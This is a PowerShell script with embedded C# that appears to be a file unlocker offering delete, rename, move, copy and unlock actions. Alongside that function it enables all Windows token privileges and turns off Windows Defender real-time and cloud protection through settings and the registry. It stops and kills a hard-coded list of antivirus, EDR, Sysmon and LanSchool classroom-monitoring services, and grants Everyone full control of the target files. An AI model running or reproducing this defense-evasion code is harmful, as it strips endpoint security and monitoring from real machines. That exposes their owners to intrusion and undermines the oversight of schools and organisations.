
# === MANUAL ARGUMENT PARSING (avoids escaping issues) ===
$TargetPath = $null
$Action = 'unlock'
$ActionArg = ''
$i = 0
while ($i -lt $args.Count) {
  switch ($args[$i].ToLower()) {
    '-targetpath' { if ($i + 1 -lt $args.Count) { $TargetPath = $args[$i+1]; $i += 2 } else { $i++ } }
    '-action'     { if ($i + 1 -lt $args.Count) { $Action = $args[$i+1]; $i += 2 } else { $i++ } }
    '-actionarg'  { if ($i + 1 -lt $args.Count) { $ActionArg = $args[$i+1]; $i += 2 } else { $i++ } }
    default { $i++ }
  }
}

# === C# NATIVE CODE ===
$nativeCode = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace NativeOps {
  public class Win32 {
    [StructLayout(LayoutKind.Sequential)]
    public struct RM_UNIQUE_PROCESS { public int dwProcessId; public FILETIME ProcessStartTime; }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct RM_PROCESS_INFO {
      public RM_UNIQUE_PROCESS Process;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst=256)] public string strAppName;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst=64)] public string strServiceShortName;
      public int ApplicationType;
      public uint AppStatus;
      public uint TSSessionId;
      [MarshalAs(UnmanagedType.Bool)] public bool bRestartable;
    }

    [DllImport("rstrtmgr.dll", CharSet=CharSet.Auto)] public static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);
    [DllImport("rstrtmgr.dll")] public static extern int RmEndSession(uint pSessionHandle);
    [DllImport("rstrtmgr.dll", CharSet=CharSet.Unicode)]
      public static extern int RmRegisterResources(uint pSessionHandle, uint nFiles, string[] rgsFiles, uint nServices, string[] rgsServices, uint nProcesses, RM_UNIQUE_PROCESS[] rgProcesses);
    [DllImport("rstrtmgr.dll")]
      public static extern int RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded, ref uint pnProcInfo, [In, Out] RM_PROCESS_INFO[] rgAffectedApps, ref uint lpdwRebootReasons);
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
      public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, uint dwFlags);
    [DllImport("kernel32.dll", SetLastError=true)]
      public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
      public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
    [DllImport("kernel32.dll", SetLastError=true)]
      public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll")]
      public static extern IntPtr GetCurrentProcess();
    [DllImport("ntdll.dll")]
      public static extern int RtlAdjustPrivilege(uint Privilege, bool Enable, bool CurrentThread, out bool Enabled);

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const int TOKEN_QUERY = 0x0008;
    public const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;
    public const uint PROCESS_TERMINATE = 0x0001;
    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint SYNCHRONIZE = 0x00100000;
    public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
      public uint PrivilegeCount;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=1)] public LUID_AND_ATTRIBUTES[] Privileges;
    }

    public static bool EnablePrivilege(string privilege) {
      IntPtr tokenHandle;
      if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle)) return false;
      try {
        LUID luid;
        if (!LookupPrivilegeValue(null, privilege, out luid)) return false;
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges = new LUID_AND_ATTRIBUTES[1];
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        return AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
      } finally { CloseHandle(tokenHandle); }
    }

    public static void EnableAllPrivileges() {
      string[] privileges = new string[] {
        "SeAssignPrimaryTokenPrivilege",
        "SeAuditPrivilege",
        "SeBackupPrivilege",
        "SeChangeNotifyPrivilege",
        "SeCreateGlobalPrivilege",
        "SeCreatePagefilePrivilege",
        "SeCreatePermanentPrivilege",
        "SeCreateSymbolicLinkPrivilege",
        "SeCreateTokenPrivilege",
        "SeDebugPrivilege",
        "SeEnableDelegationPrivilege",
        "SeImpersonatePrivilege",
        "SeIncreaseBasePriorityPrivilege",
        "SeIncreaseQuotaPrivilege",
        "SeIncreaseWorkingSetPrivilege",
        "SeLoadDriverPrivilege",
        "SeLockMemoryPrivilege",
        "SeMachineAccountPrivilege",
        "SeManageVolumePrivilege",
        "SeProfileSingleProcessPrivilege",
        "SeRelabelPrivilege",
        "SeRemoteShutdownPrivilege",
        "SeRestorePrivilege",
        "SeSecurityPrivilege",
        "SeShutdownPrivilege",
        "SeSyncAgentPrivilege",
        "SeSystemEnvironmentPrivilege",
        "SeSystemProfilePrivilege",
        "SeSystemtimePrivilege",
        "SeTakeOwnershipPrivilege",
        "SeTcbPrivilege",
        "SeTimeZonePrivilege",
        "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege"
      };
      foreach (string priv in privileges) {
        try {
          EnablePrivilege(priv);
        } catch { }
      }
    }

    public static int[] GetLockingProcesses(string[] filePaths) {
      List<int> pids = new List<int>();
      uint sessionHandle;
      string sessionKey = Guid.NewGuid().ToString();
      if (RmStartSession(out sessionHandle, 0, sessionKey) != 0) return pids.ToArray();
      try {
        if (RmRegisterResources(sessionHandle, (uint)filePaths.Length, filePaths, 0, null, 0, null) != 0) return pids.ToArray();
        uint needed = 0, count = 0, reasons = 0;
        RmGetList(sessionHandle, out needed, ref count, null, ref reasons);
        if (needed > 0) {
          RM_PROCESS_INFO[] processes = new RM_PROCESS_INFO[needed];
          count = needed;
          if (RmGetList(sessionHandle, out needed, ref count, processes, ref reasons) == 0) {
            for (int i = 0; i < count; i++) pids.Add(processes[i].Process.dwProcessId);
          }
        }
      } finally { RmEndSession(sessionHandle); }
      return pids.ToArray();
    }

    public static bool ForceKillProcess(int pid) {
      IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
      if (hProcess == IntPtr.Zero) return false;
      try {
        return TerminateProcess(hProcess, 0);
      } finally {
        CloseHandle(hProcess);
      }
    }
  }
}
'@

# === Initialize Log ===
$logEntries = @("=== Started at $(Get-Date -Format 'HH:mm:ss') ===")
function Add-LogEntry($msg) {
  $script:logEntries += $msg
}
Add-LogEntry "Received TargetPath: $TargetPath"
Add-LogEntry "Received Action: $Action"
Add-LogEntry "Received ActionArg: $ActionArg"

# === Load Native Code ===
try {
  Add-Type -TypeDefinition $nativeCode -ReferencedAssemblies "System.Runtime.InteropServices" -ErrorAction Stop
  [NativeOps.Win32]::EnableAllPrivileges()
  Add-LogEntry "Native code loaded, ALL privileges enabled"
} catch {
  Add-LogEntry "Native code load failed: $_"
}

# === Temporarily Disable Windows Defender Protections ===
try {
  Add-LogEntry "Trying to temporarily disable Windows Defender real-time protection..."
  Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
  Add-LogEntry "Tried to disable real-time monitoring"
} catch {
  Add-LogEntry "Failed to disable real-time monitoring: $_"
}

try {
  Add-LogEntry "Trying to disable Windows Defender cloud protection..."
  Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
  Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
  Add-LogEntry "Tried to disable cloud protections"
} catch {
  Add-LogEntry "Failed to disable cloud protections: $_"
}

try {
  Add-LogEntry "Trying to stop Windows Defender services via registry..."
  $wdServices = @("WinDefend", "Sense", "WdNisSvc", "MsMpEng")
  foreach ($svc in $wdServices) {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name "Start" -Value 4 -ErrorAction SilentlyContinue
  }
  Add-LogEntry "Set Windows Defender services to disabled"
} catch {
  Add-LogEntry "Failed to modify service registry: $_"
}

# === Check Path Exists ===
Add-LogEntry "Checking if path exists with Test-Path: $TargetPath"
if (-not (Test-Path -Path $TargetPath -ErrorAction SilentlyContinue)) {
  Add-LogEntry "Test-Path failed, checking with Get-Item..."
  try {
    $item = Get-Item -Path $TargetPath -Force -ErrorAction Stop
    Add-LogEntry "Get-Item found it! Path is valid"
  } catch {
    $finalResult = @{
      success = $false
      scheduledReboot = $false
      killedPids = @()
      stoppedServices = @()
      log = $logEntries + @("ERROR: Path does not exist or is not accessible: $TargetPath")
      actionResult = "Path not found: $TargetPath"
    }
    $finalResult | ConvertTo-Json -Depth 10
    exit 1
  }
}

# === Get Target Files ===
$item = Get-Item -Path $TargetPath -Force -ErrorAction SilentlyContinue
Add-LogEntry "Target item type: $(if ($item.PSIsContainer) { 'Directory' } else { 'File' })"

$allTargetFiles = @()
if ($item.PSIsContainer) {
  Add-LogEntry "Scanning directory for files..."
  $allTargetFiles = Get-ChildItem -Path $TargetPath -File -Recurse -Force -ErrorAction SilentlyContinue | 
                    Select-Object -First 1000 | ForEach-Object { $_.FullName }
} else {
  $allTargetFiles = @($item.FullName)
}
Add-LogEntry "Found $($allTargetFiles.Count) target files"

# === Step 1: Stop Problematic Services ===
$problematicServices = @('LanSchoolBusService','LanSchool','LanSchoolHelper','SentinelAgent','SentinelStaticEngine','SentinelHelperService','sentinelmonitor','CsAgent','csfalconservice','CSFalconContainer','CbDefense','CbDefenseSensor','CarbonBlack','SepMasterService','SmcService','ccSetMgr','mfemms','mfevtp','McAfeeFramework','Tmntsrv','TmPfw','tmpreflt','CiscoAMP','CiscoAMPCEFWDriver','umbrella_rc','deepinstinct','klif','kl1','klflt','WinDefend','Sense','WdBoot','WdNisDrv','WdNisSvc','MBAMService','MBAMAgent','AVGSvc','AVGIDSAgent','avast','AvastSvc','AvastAntivirus','eset','ekrn','Kaspersky','klnagent','avp','Sophos','SAVService','SAVAdminService','BitDefender','bdredline','vsserv','Norton','Symantec','ccSvcHst','ccApp','TrendMicro','tmccsf','tmlisten','pccNTMon','Malwarebytes','MBAMService','SuperAntiSpyware','SUPERAntiSpywareService','WSearch','Sysmon','Sysmon64','MsMpEng')
$stoppedServicesList = @()
$targetDirectory = Split-Path -Parent -Path $TargetPath
$targetBaseName = [System.IO.Path]::GetFileNameWithoutExtension($TargetPath)

Add-LogEntry "Stopping known problematic services..."
try {
  $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue
  foreach ($svc in $services) {
    $isMatch = $problematicServices -contains $svc.Name
    $pathMatch = $svc.PathName -and ($svc.PathName -match [regex]::Escape($targetDirectory) -or $svc.PathName -match [regex]::Escape($targetBaseName))
    if (($isMatch -or $pathMatch) -and $svc.State -ne 'Stopped') {
      Add-LogEntry "Stopping service: $($svc.Name)"
      $stopped = $false
      try { Stop-Service -Name $svc.Name -Force -ErrorAction Stop; $stopped = $true } catch {}
      if (-not $stopped) { try { & sc.exe stop $svc.Name *>&1 | Out-Null; Start-Sleep -Milliseconds 300; if ($LASTEXITCODE -eq 0) { $stopped = $true } } catch {} }
      if (-not $stopped) { try { & wmic.exe service where Name="$($svc.Name)" call stopservice *>&1 | Out-Null; Start-Sleep -Milliseconds 300; $stopped = $true } catch {} }
      if ($stopped) { $stoppedServicesList += $svc.Name; Add-LogEntry "Successfully stopped service: $($svc.Name)" }
    }
  }
} catch {
  Add-LogEntry "Service enumeration failed, continuing"
}

# === Step 2: Kill Associated Processes ===
Add-LogEntry "Killing problematic processes..."
Get-Process -ErrorAction SilentlyContinue | Where-Object {
  $_.ProcessName -in $problematicServices -or 
  ($_.Path -and $_.Path -match [regex]::Escape($targetDirectory)) -or
  ($_.Path -and $_.Path -match [regex]::Escape($targetBaseName))
} | ForEach-Object {
  try {
    Add-LogEntry "Killing process: $($_.Name) PID:$($_.Id)"
    $pidToKill = $_.Id
    $killed = $false
    
    try { 
      if ([NativeOps.Win32]::ForceKillProcess($pidToKill)) { $killed = $true }
    } catch {}
    if (-not $killed) { try { Stop-Process -Id $pidToKill -Force -ErrorAction Stop; $killed = $true } catch {} }
    if (-not $killed) { try { & taskkill.exe /F /T /PID $pidToKill *>&1 | Out-Null; if ($LASTEXITCODE -eq 0) { $killed = $true } } catch {} }
    if (-not $killed) { try { & wmic.exe process where ProcessId=$pidToKill delete *>&1 | Out-Null; $killed = $true } catch {} }
    if ($killed) { Add-LogEntry "Successfully killed PID: $pidToKill" }
  } catch {}
}

# === Step 3: Take Ownership & Set Permissions ===
Add-LogEntry "Taking ownership and setting permissions..."
try {
  & takeown.exe /F $TargetPath /R /A /D Y *>&1 | Out-Null
} catch {}
try {
  & icacls.exe $TargetPath /grant Administrators:F /T /C /Q *>&1 | Out-Null
} catch {}
try {
  & icacls.exe $TargetPath /grant SYSTEM:F /T /C /Q *>&1 | Out-Null
} catch {}
try {
  & icacls.exe $TargetPath /grant Everyone:F /T /C /Q *>&1 | Out-Null
} catch {}
try {
  & icacls.exe $TargetPath /inheritance:r /T /C /Q *>&1 | Out-Null
} catch {}

# === Step 4: Kill Locking Processes ===
$killedPidsList = @()
if ($allTargetFiles.Count -gt 0) {
  try {
    $lockingPids = [NativeOps.Win32]::GetLockingProcesses($allTargetFiles)
    Add-LogEntry "Found $($lockingPids.Count) locking process(es)"
    foreach ($pidToKill in $lockingPids) {
      if ($pidToKill -le 4) { continue }
      $killed = $false
      try { $killed = [NativeOps.Win32]::ForceKillProcess($pidToKill) } catch {}
      if (-not $killed) { try { Stop-Process -Id $pidToKill -Force -ErrorAction Stop; $killed = $true } catch {} }
      if (-not $killed) { try { & taskkill.exe /F /PID $pidToKill *>&1 | Out-Null; if ($LASTEXITCODE -eq 0) { $killed = $true } } catch {} }
      if ($killed) { $killedPidsList += $pidToKill; Add-LogEntry "Killed PID: $pidToKill" }
    }
  } catch {
    Add-LogEntry "Error checking locking processes: $_"
  }
}
if ($killedPidsList.Count -gt 0) { Start-Sleep -Milliseconds 1000 }

# === Step 5: Perform Action ===
$scheduledReboot = $false
$success = $false
$actionResultMsg = "No action performed"

function Test-Delete($path) {
  Add-LogEntry "Trying Delete Method 1: PowerShell Remove-Item"
  try {
    Remove-Item -Path $path -Recurse -Force -ErrorAction Stop
    Start-Sleep -Milliseconds 100
    if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) { return $true }
  } catch { Add-LogEntry "Method1 failed: $_" }

  Add-LogEntry "Trying Delete Method 2: cmd.exe"
  try {
    $escaped = "`"$path`""
    if ((Get-Item -Path $path -ErrorAction SilentlyContinue) -and (Get-Item -Path $path -ErrorAction SilentlyContinue).PSIsContainer) {
      & cmd.exe /c "rd /s /q $escaped" *>&1 | Out-Null
    } else {
      & cmd.exe /c "del /f /q /a $escaped" *>&1 | Out-Null
    }
    Start-Sleep -Milliseconds 200
    if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) { return $true }
  } catch { Add-LogEntry "Method2 failed: $_" }

  Add-LogEntry "Trying Delete Method 3: .NET"
  try {
    if ((Get-Item -Path $path -ErrorAction SilentlyContinue) -and (Get-Item -Path $path -ErrorAction SilentlyContinue).PSIsContainer) {
      [System.IO.Directory]::Delete($path, $true)
    } else {
      [System.IO.File]::Delete($path)
    }
    Start-Sleep -Milliseconds 100
    if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) { return $true }
  } catch { Add-LogEntry "Method3 failed: $_" }

  Add-LogEntry "Trying Delete Method 4: Move to temp"
  try {
    $tempDest = Join-Path -Path $env:TEMP -ChildPath ("temp_delete_" + [System.Guid]::NewGuid().ToString())
    Move-Item -Path $path -Destination $tempDest -Force -ErrorAction Stop
    Remove-Item -Path $tempDest -Recurse -Force -ErrorAction Stop
    Start-Sleep -Milliseconds 100
    if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) { return $true }
  } catch { Add-LogEntry "Method4 failed: $_" }

  Add-LogEntry "Trying Delete Method 5: Robocopy Mirror"
  try {
    $emptyDir = Join-Path -Path $env:TEMP -ChildPath ("empty_mirror_" + [System.Guid]::NewGuid().ToString())
    New-Item -Path $emptyDir -ItemType Directory -Force | Out-Null
    if ((Get-Item -Path $path -ErrorAction SilentlyContinue) -and (Get-Item -Path $path -ErrorAction SilentlyContinue).PSIsContainer) {
      & robocopy.exe $emptyDir $path /MIR /R:0 /W:0 *>&1 | Out-Null
      Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
    Remove-Item -Path $emptyDir -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 100
    if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) { return $true }
  } catch { Add-LogEntry "Method5 failed: $_" }

  Add-LogEntry "Trying Delete Method 6: Using .NET FileStream with DeleteOnClose"
  try {
    if ((Get-Item -Path $path -ErrorAction SilentlyContinue) -and -not (Get-Item -Path $path -ErrorAction SilentlyContinue).PSIsContainer) {
      $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Delete)
      $fs.Close()
      [System.IO.File]::Delete($path)
      Start-Sleep -Milliseconds 100
      if (-not (Test-Path -Path $path -ErrorAction SilentlyContinue)) { return $true }
    }
  } catch { Add-LogEntry "Method6 failed: $_" }

  return -not (Test-Path -Path $path -ErrorAction SilentlyContinue)
}

switch ($Action.ToLower()) {
  'delete' {
    Add-LogEntry "Executing DELETE action..."
    if (Test-Delete $TargetPath) {
      $success = $true
      $actionResultMsg = "Deleted successfully"
      Add-LogEntry "Delete successful"
    } else {
      Add-LogEntry "All delete methods failed, trying schedule reboot..."
      try {
        $ok = [NativeOps.Win32]::MoveFileEx($TargetPath, $null, [NativeOps.Win32]::MOVEFILE_DELAY_UNTIL_REBOOT)
        if ($ok) {
          $success = $true
          $scheduledReboot = $true
          $actionResultMsg = "Scheduled for deletion on next reboot"
        } else {
          $actionResultMsg = "Delete failed"
        }
      } catch {
        $actionResultMsg = "Delete failed"
      }
    }
  }
  'rename' {
    Add-LogEntry "Executing RENAME to $ActionArg..."
    $targetDir = Split-Path -Parent -Path $TargetPath
    $newPath = Join-Path -Path $targetDir -ChildPath $ActionArg
    try {
      Rename-Item -Path $TargetPath -NewName $ActionArg -Force -ErrorAction Stop
      $success = $true
      $actionResultMsg = "Renamed successfully"
    } catch {
      try {
        $ok = [NativeOps.Win32]::MoveFileEx($TargetPath, $newPath, [NativeOps.Win32]::MOVEFILE_DELAY_UNTIL_REBOOT)
        if ($ok) {
          $success = $true
          $scheduledReboot = $true
          $actionResultMsg = "Rename scheduled for reboot"
        } else {
          $actionResultMsg = "Rename failed"
        }
      } catch {
        $actionResultMsg = "Rename failed"
      }
    }
  }
  'move' {
    Add-LogEntry "Executing MOVE to $ActionArg..."
    try {
      Move-Item -Path $TargetPath -Destination $ActionArg -Force -ErrorAction Stop
      $success = $true
      $actionResultMsg = "Moved successfully"
    } catch {
      try {
        $ok = [NativeOps.Win32]::MoveFileEx($TargetPath, $ActionArg, [NativeOps.Win32]::MOVEFILE_DELAY_UNTIL_REBOOT)
        if ($ok) {
          $success = $true
          $scheduledReboot = $true
          $actionResultMsg = "Move scheduled for reboot"
        } else {
          $actionResultMsg = "Move failed"
        }
      } catch {
        $actionResultMsg = "Move failed"
      }
    }
  }
  'copy' {
    Add-LogEntry "Executing COPY to $ActionArg..."
    try {
      Copy-Item -Path $TargetPath -Destination $ActionArg -Recurse -Force -ErrorAction Stop
      $success = $true
      $actionResultMsg = "Copied successfully"
    } catch {
      $actionResultMsg = "Copy failed"
    }
  }
  'unlock' {
    $success = $true
    $actionResultMsg = "Unlocked: $($killedPidsList.Count) processes killed, $($stoppedServicesList.Count) services stopped"
  }
}

# === OUTPUT ===
$finalResult = @{
  success = $success
  scheduledReboot = $scheduledReboot
  killedPids = $killedPidsList
  stoppedServices = $stoppedServicesList
  log = $logEntries + @("=== Ended at $(Get-Date -Format 'HH:mm:ss') ===")
  actionResult = $actionResultMsg
}

$finalResult | ConvertTo-Json -Depth 10
